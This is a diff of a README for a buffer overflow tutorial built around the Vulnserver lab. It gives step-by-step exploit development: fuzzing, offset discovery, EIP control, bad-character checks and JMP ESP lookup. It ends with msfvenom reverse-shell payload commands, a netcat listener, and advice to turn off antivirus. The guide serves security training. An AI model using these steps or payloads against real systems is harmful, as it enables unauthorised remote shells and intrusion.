@@ -1,17 +1,17 @@
 ![image](https://github.com/planetxort/Buffer-Overflow-Guide/blob/master/buffer-overflow-attacks.png)
 # Buffer Overflow Guide
-This is a Bufferflow Guide, inspired by TheCyberMentor's Buffer Overflow tutorial: [Buffer Overflows Made Easy](https://www.youtube.com/watch?v=qSnPayW6F7U&list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G) 
+Bufferflow Guide, inspired by TheCyberMentor's Buffer Overflow tutorial: [Buffer Overflows Made Easy](https://www.youtube.com/watch?v=qSnPayW6F7U&list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G) 
 
 # Background:
-This repository is meant to be supplemental information based on TheCyberMentor's walkthrough. I created this guide with the intent to provide step-by-step written instructions, and hopefully provide greater insight or additional confidence in your pursuit to learn this technique. I believe that notetaking can be a difficult for many individuals, therefore the goal of this repository is to consolidate steps into a reference sheet, and provide the scripts used in TheCyberMentor's video series. All credit for the scripts go to TheCyberMentor. The only changes I made to the scripts were morale-building naming conventions and providing an additional script for Linux buffer-overflows. The beauty of this repository is that it can be cloned to your linux machine (removing the need for manually typing out python scripts), and utilized as a reference if you forget any of the steps in TheCyberMentor's Walkthrough (or cloned before watching his video series)
+This repository is supplemental information based on TheCyberMentor's walkthrough. I created this guide with the intent to provide step-by-step written instructions, and hopefully provide greater insight or additional confidence in your pursuit to learn this technique. I believe that notetaking can be difficult for many individuals, therefore the goal of this repository is to consolidate steps into a reference sheet and provide the scripts used in TheCyberMentor's video series. All credit for the scripts goes to TheCyberMentor. The only changes I made to the scripts were morale-building naming conventions and providing an additional methodology for Linux Buffer Overflows. The beauty of this repository is that you can clone it to your Linux machine (removing the need for manually typing out python scripts) and utilize it as a reference if you forget any of the steps in TheCyberMentor's Walkthrough (or cloned before watching his video series)
 
 # Assumed Knowledge
 1. Lab Setup
 2. An understanding of Network adapters and communication between Windows/Linux
-3. Basic understanding of Metasploit, Python and Shells
-4. You have at least watched TheCyberMentor's Video Series, or you have a baseline level of buffer overflow understanding
+3. Basic knowledge of Metasploit, Python, and Shells
+4. You have watched TheCyberMentor's Video Series, or you have a baseline level of buffer overflow understanding
 5. Enumeration Methodology (Linux and Windows)
-6. Basic Usage of Immunity Debugger
+6. Immunity Debugger
 
 # Tools needed:
 1. Kali Linux
@@ -19,12 +19,12 @@ This repository is meant to be supplemental information based on TheCyberMentor'
 3. Vulnserver: [Download Link](https://sites.google.com/site/lupingreycorner/vulnserver.zip?attredirects=0) (if you're following along with TheCyberMentor's video series)
 
 # Additional Setup Considerations
-1. Ensure you have permisson to run executable files as Administrator on Windows.
-2. Download or Copy the code of [Mona.py](https://github.com/corelan/mona/blob/master/mona.py), you will need this for module functionality in Immunity Debugger.
+1. Ensure you have permission to run executable files as Administrator on Windows.
+2. Download or Copy the code of [Mona.py](https://github.com/corelan/mona/blob/master/mona.py); you will need this for module functionality in Immunity Debugger.
 3. Place the Mona.py file in the following directory: C:/Program Files(x86)/Immunity Inc/Immunity Debugger/PyCommands
-4. One last consideration: Ensure you have connectivity between your Lab Environment (do a ping from your linux host to your windows host) ping x.x.x.x - If you don't, please read guides on understanding Network Adapter Settings for your specific virtialization software.
+4. One last consideration: Ensure you have connectivity between your Lab Environment (do a ping from your Linux host to your windows host) ping x.x.x.x - If you don't, please read guides on understanding Network Adapter Settings for your specific virtualization software.
 5. If you're exploiting windows, please read the "Linux Considerations" section before attempting to start on any of these steps.
-6. Turn off Windows Defender or other Antivirus solutions. It's been known to have issues with Vulnserver. If you're testing against a different vulnerable machine, I still recommend doing the same to avoid any issues with Defender from killing your shell.
+6. Turn off Windows Defender or other Antivirus solutions. If you don't, you may have issues with Vulnserver. If you're testing against a different vulnerable machine, I still recommend doing the same to avoid any problems with Defender killing your shell.
 
 # Table of Contents
 1. Identification
@@ -37,44 +37,44 @@ This repository is meant to be supplemental information based on TheCyberMentor'
 8. Exploiting the System
 
 # 1. Identification
-The typical Buffer Overflow scenario relies on Reverse Engineering an executable file. Before you attempt to Spike, etc, you're going to want to find an executable file. In the instance of Vulnserver, you will be given an executable file. In a realistic scenario, you're going to want to perform enumeration methodology and look for an executable file to download. These are typically hosted via SMB Shares, FTP Servers, Exposed Web Directories, etc. Use best practice regarding enumeration and continue with this guide when you have an executable file.
+The typical Buffer Overflow scenario relies on Reverse Engineering an executable file. Before you attempt to Spike, you're going to want to find an executable file. In the instance of Vulnserver, you will download an executable file. In a realistic scenario, you're going to want to perform enumeration methodology and look for an executable file to download. These are hosted via SMB Shares, FTP Servers, Exposed Web Directories, etc. Use best practice regarding enumeration and continue with this guide when you have an executable file.
 
 # 2. Spiking
 Spiking is all about identifying what command is vulnerable (observed by the program breaking in Immunity)
 
 Steps:
-1. Connect to a port or a program that allows you to send specific commands, for instance, you may see that the system you're trying to exploit has a service on port 9999.
+1. Connect to a port or a program that allows you to send specific commands, for instance; you may see that the system you're trying to exploit has a service on port 9999.
 Command: nc -nv 9999
-2. Observe the commands that can be utilized on the service, in TheCyberMentor video, the vulnerable service command was "TRUN" but in reality, you will likely have to use the provided script on multiple commands until the program breaks.
+2. Observe the commands that you can use on the service, in TheCyberMentor video, the vulnerable service command was "TRUN," but in reality, you will likely have to use the provided script on multiple commands until the program breaks.
 3. Run Immunity as Admin.
 4. Run the executable you found. (or downloaded for practice)
 5. Attach to the executable process.
-6. Click the "Play" button in Immunity, ensure it says Running on the bottom right hand corner.
+6. Click the "Play" button in Immunity, ensure it says Running on the bottom right-hand corner.
 7. Use the provided command.spk file, ensuring that you edit the 'STATS' command with whatever command you're attempting to test.
-Command: generic_send_tcp ip port command.spk 0 0
+Command: generic_send_tcp IP port command.spk 0 0
 8. After you utilize the command.spk, look to see if there's an Access Violation in Immunity, if there is not, edit the command within the command.spk to a different one and retest.
 
 # 3. Fuzzing
-The process of fuzzing is to attempt to narrow down the amount of bytes it took to crash the program.
+The process of Fuzzing is to attempt to identify the number of bytes it took to crash the program.
 
-1. Edit the provided fuzz.py script. Replace the IP, PORT, and TRUN command with the IP, port and command that you want to test.
+1. Edit the provided fuzz.py script. Replace the IP, PORT, and TRUN command with the IP, port, and command you want to test.
 Command: python fuzz.py
-2. Try to use CTRL+C to stop the script exactly when you see an Access Violation pop-up in Immunity. This will ensure you can more accurately estimate the bytes it took to crash it.
-3. Write down the amount of bytes it took to crash the program
+2. Try to use CTRL+C to stop the script exactly when you see an Access Violation pop-up in Immunity. Doing so will ensure you can more accurately estimate the bytes it took to crash it.
+3. Write down the number of bytes it took to crash the program
 
 # 4. Finding the Offset
-The correct identification of the offset will help ensure that the shellcode you generate will not immediately crash the program.
+The correct identification of the offset will help ensure that the Shellcode you generate will not immediately crash the program.
 
 1. Generate pattern code, replacing the number in the command with the number of bytes it took to crash the program (found in step 3)
 Command: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
 2. Copy the output of the pattern_create command and edit the offset.py script provided in this repository. Replace the existing offset value portion of the script with the pattern that you generated from the command. Replace the IP, Port, and Command as you did in the previous testing sections.
-3. Close out Immunity + the executable program.
+3. Closeout Immunity + the executable program.
 4. Repeat the process of relaunching Immunity and attaching to the executable program.
 5. Run the script
 Command: python offset.py
 6. Go into Immunity and look for a number written in the EIP space.
-7. If there is not a number written into the EIP space, the amount of bytes you identified in your Fuzz may be off. Go back to step 1 and regenerate pattern code, using a number higher than whatever you had written to the script. For instance, if you used 700, try 1000, or 1200. If you are unsuccessful, you may have messed up during Fuzzing. Go back to the Fuzzing section and try to stop the script faster when you see the Access Violation in Immunity.
-8. When you find a number written to the EIP, write this number down somewhere. Use the following command, replacing the -l switch value with your identified fuzz-bytes number from step 1, and replace the -q switch with the number that was written into the EIP.
+7. If there is no number written into the EIP space, the number of bytes you identified in your Fuzz may be off. Go back to step 1 and regenerate pattern code, using a number higher than whatever you had written to the script. For instance, if you used 700, try 1000, or 1200. If you are unsuccessful, you may have messed up during Fuzzing. Go back to the Fuzzing section and try to stop the script faster when you see the Access Violation in Immunity.
+8. When you find a number written to the EIP, write this number down somewhere. Use the following command, replacing the -l switch value with your identified fuzz-bytes number from step 1, and replace the -q switch with the number that is written to the EIP.
 Command: /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2500 -q 386F4337
 9. If everything is correct, when you run the above command, you should get an exact offset match that looks like this:
  **[*] Exact match at offset 2003**
@@ -83,33 +83,33 @@ Command: /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2500
 # 5. Overwriting the EIP
 This step will help you ensure that you can control the EIP. If you are successful, you will observe 4 "B" characters within the EIP space (Based off of the script code)
 1. Edit the provided python script to test your offset (shelling-out.py)
-2. Replace "2003" with your offset value found in step 9 of the Offset section, replace the IP, port and command with your values as you did in previous sections.
+2. Replace "2003" with your offset value found in step 9 of the Offset section, replace the IP, port, and command with your values as you did in previous sections.
 3. Run the script
 Command: python shelling-out.py
 4. You should now observe 4 "B characters" represented by 42424242 written to the EIP.
 5. You now control the EIP.
 
 # 6. Finding Bad Characters
-The focus of this section is identifying bad characters so you can ensure they do **not** get included in your shellcode.
+The focus of this section is identifying bad characters so you can ensure they do **not** get included in your Shellcode.
 1. The original script is now modified to use Georgia Weidman's bad character cheat sheet.
-2. Null bytes x00 are automatically disincluded because of issues they tend to cause during Buffer Overflows, make sure that you note that as your first bad character.
-3. Edit the provided badcharizard.py script, copy the Bad Characters section into a notepad, or somewhere that you can compare them against the Immunity Console. Ensure that you change the IP, Port and Command within the script with your values.
+2. Null bytes x00 are automatically considered bad because of issues they tend to cause during Buffer Overflows, make sure that you note that as your first bad character.
+3. Edit the provided badcharizard.py script, copy the Bad Characters section into a notepad, or somewhere that you can compare them against the Immunity Console. Ensure that you change the IP, Port, and Command within the script with your values.
 4. Relaunch Immunity and the executable, attaching to the program as you did in previous steps.
 5. Run the script
 Command: python badcharizard.py
-6. Go to Immunity, right click on the ESP value and click on "Follow in Dump"
-7. Right click on the Hex Dump tab and click "Appearance -> Font -> OEM" this will make the values a little bigger for comparison.
-8. In the Hex Dump, 01 represents the first bad character tested while FF represents the last. The bad characters go in order, and the difference between the Hex Dump and the Bad Characters that you copied into a notepad, etc need to be compared.
-9. For example, the first line of the Hex Dump could read 01 02 03 04 05, if you see a skip within this order, the character it skips is a **bad character**. As an example, imagine the first line of the Hex Dump read 01 02 03 05 06, you would now know that 04 is a bad character because it skipped it, so you would annotate x04 as a bad character for later. You have to evaluate all the lines until you hit your first FF. It's a true "eye test" as TheCyberMentor says.
-10. Double check for bad characters, and then triple check, and then quadruple check. If you do not have the correct list of bad characters to avoid using in your shellcode, it will fail.
+6. Go to Immunity, right-click on the ESP value, and click on "Follow in Dump."
+7. Right-click on the Hex Dump tab and click "Appearance -> Font -> OEM" this will make the values a little bigger for comparison.
+8. In the Hex Dump, 01 represents the first bad character tested while FF represents the last. The bad characters go in order, compare the Hex Dump with the characters you copied into Notepad.
+9. For example, the first line of the Hex Dump could read 01 02 03 04 05, if you see a skip within this order, the character it skips is a **bad character**. For example, imagine the first line of the Hex Dump read 01 02 03 05 06, you would now know that 04 is a bad character because it skipped it. You would annotate x04 as a bad character for later. You have to evaluate all the lines until you hit your first FF. It's a true "eye test," as TheCyberMentor says.
+10. Double-check for bad characters, and then triple check, and then quadruple check. If you do not have the correct list of bad characters to avoid using in your Shellcode, it will fail.
 
 # 7. Finding the Correct Module
-It's time to find what pointer you need to use to direct the program to your shellcode for the Buffer Overflow
+It's time to find what pointer you need to use to direct the program to your Shellcode for the Buffer Overflow
 1. Relaunch your Immunity and your program, reattach. This time, do not press the "play" button.
-2. Go into Immunity, and in the white space underneat the "terminals" type: !mona modules
-3. You will see a bunch of information come up, you are concerned with the Module Info section. You are looking for a module that has all "False" values, preferably a dll but it could be the actual exe you're attached to depending on the box you're attempting to exploit.
-4. Write down this module, for example: essfunc.dll
-5. You are now going to identify the JMP ESP, this is important because it represents the pointer value and will be essential for using your shellcode.
+2. Go into Immunity, and in the white space underneath the "terminals" type: !mona modules
+3. You will see a bunch of information come up; you are concerned with the Module Info section. You are looking for a module that has all "False" values, preferably a dll, but it could be the actual exe you're attached to depending on the box you're attempting to exploit.
+4. Write down this module, for example, essfunc.dll
+5. You are now going to identify the JMP ESP, which is crucial because it represents the pointer value and will be essential for using your Shellcode.
 6. JMP ESP converted to hex is FFE4, that's what you're looking for.
 7. Return to that command box you used for mona modules, this time type: !mona find -s "\xff\xe4" -m essfunc.dll
 8. The -m switch represents the module that you're trying to find the JMP ESP for, ensure that you swap out essfunc.dll with whatever the module value you wrote down in step 4.
@@ -123,14 +123,14 @@ It's time to find what pointer you need to use to direct the program to your she
 0x625011f7
 0x62501203
 0x62501205
-10. Write down any of the column results that are all "false", you will have to test these. In the instance of vulnserver, the result that will work is 625011af, but if you didn't know that, you might have to perform the next steps on multiple of these false column results.
-11. Edit the included jumpboyz.py script, edit the shellcode string with the reversed version of one of the results you got from step 10, for example: "\xaf\x11\x50\x62" represents 625011af. Ensure you edit the IP, port and command of the script.
-12. Go back to Immunity's CPU window, click the black arrow, and type in the pointer being tested in order to follow the expression (for instance: 625011af)
-13. Click the pointer in the window in the top left hand corner, click F2, you should see the value highlighted with a color. This sets a break point for testing.
+10. Write down any of the column results that are all "false." You will have to test these. In the instance of vulnserver, the result that will work is 625011af, but if you didn't know that, you might have to perform the next steps on multiple of these false column results.
+11. Edit the included jumpboyz.py script, edit the shellcode string with the reversed version of one of the results you got from step 10, for example: "\xaf\x11\x50\x62" represents 625011af. Ensure you edit the IP, port, and command of the script.
+12. Go back to Immunity's CPU window, click the black arrow, and type in the pointer tested to follow the expression (for instance: 625011af)
+13. Click the pointer in the window in the top left-hand corner, click F2, you should see the value highlighted with a color. The objective is to set a break-point for testing.
 14. Now, you can click the "Play" button and observe "Running" in the bottom corner of Immunity.
 15. Run the python script
 Command: python jumpboyz.py
-16. If you see the pointer value written to the EIP, you can now generate shellcode. If you don't see it, repeat the process with other column pointer values that you indentified as false from Step 9.
+16. If you see the pointer value written to the EIP, you can now generate Shellcode. If you don't see it, repeat the process with other column pointer values you identified as false from Step 9.
 
 # 8. Exploiting the System
 The last step in this process, generating Shellcode and ensuring that we can exploit the system.
@@ -138,30 +138,30 @@ The last step in this process, generating Shellcode and ensuring that we can exp
 2. Generate the Payload: 
 Command: msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.82 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
 3. Replace the LHOST with your Kali Machine IP and replace the -b switch with the bad characters that you had identified earlier. In this instance, there's only one bad character represented by "\x00"
-4. Edit the included gotem.py script. Ensure that your exploitation IP and Port and command values are correct. Take your generated shellcode and replace the overflow value that is currently in the script.
+4. Edit the included gotem.py script. Ensure that your exploitation IP and Port and command values are correct. Take your generated Shellcode and replace the overflow value that is currently in the script.
 5. Ensure that all variables are correct, including your exact byte value, pointer value, etc. 
 6. Start your netcat listener:
 Command: nc -lvp 4444
 7. Run the script:
 Command: python gotem.py
 8. If the shell doesn't catch, try to change the padding value in the script from 32 to 16 or 8. It may take some trial and error.
-9. You should now have a shell, congratulations!!
+9. You should now have a shell, congratulations.
 
 # Linux Considerations
-So you're a cool cat huh? Going after Linux? That's fine! Let me share some minor differences with you, so that you don't bang your head against the wall.
+So you're a cool cat, huh? Going after Linux? That's fine! Let me share some minor differences with you so that you do not go crazy.
 
-1. For one, if you don't want to use a Linux Debugging program, that's fine, you can use Immunity, but let me explain.
+1. If you don't want to use a Linux Debugging program, that's fine; you can use Immunity, but please let me explain.
 2. If you're attacking a Linux machine, copy the EXE that you find over to your Windows host.
-3. Perform testing with the exact same methodology defined above, with a few differences: 
--Use your Windows IP address within all of the scripts. This isn't going to work with the Linux Machine's IP address.
+3. Perform testing with the same methodology defined above, with a few differences: 
+-Use your Windows IP address within all of the scripts. The testing process isn't going to work with the Linux Machine's IP address.
 -You will have to generate Linux Shellcode.
 4. Once you have shelled your Windows system, it's time to make some quick changes to shell the Linux system.
 5. Generate Linux Shellcode:
 Command: msfvenom -p linux/x86/shell_reverse_tcp lhost=10.2.12.189 lport=4444 -f python -b '\x00'
-6. Obviously, replace the localhost with your Kali Machine and the bad characters that come after the -b switch
+6. Replace the localhost with your Kali Machine and the bad characters that come after the -b switch
 7. Edit your gotem.py script, replace the IP and Port with the Linux Machine IP and port, and edit the command that you tested against with the vulnerable command.
 8. Delete the entire overflow section, paste the payload that you generate into this section.
-9. change the overflow variable in the shellcode = line to: buf
+9. change the overflow variable in the shellcode = line to buf
 10. Save the script! 
 11. Run the script:
 Command: python gotem.py
@@ -170,12 +170,12 @@ YOU ARE A MASTER
 
 # FAQ
 1. What if the port that I connect to doesn't have any commands I can run?
--Ensure that this is indeed the correct port to exploit, if it is, and you're sure of it, try running the following command on the exe from your Kali Machine:
+-Ensure that this is the correct port to exploit, if it is, and you're sure of it, try running the following command on the exe from your Kali Machine:
 Command: strings foo.exe 
-When you run this, you should be able to identify possible commands to test against.
+When you run this, you should be able to identify possible commands to test.
 
 2. What if everything has worked, but I cannot catch a shell?
--Are you generating the correct payload? Linux vs Windows
+-Are you generating the correct payload? Linux vs. Windows
 -Have you attempted to change the padding from 32 to 16 or 8?
 -Did you identify all of the bad characters?
 -Is your pointer reversed correctly in the gotem.py script?
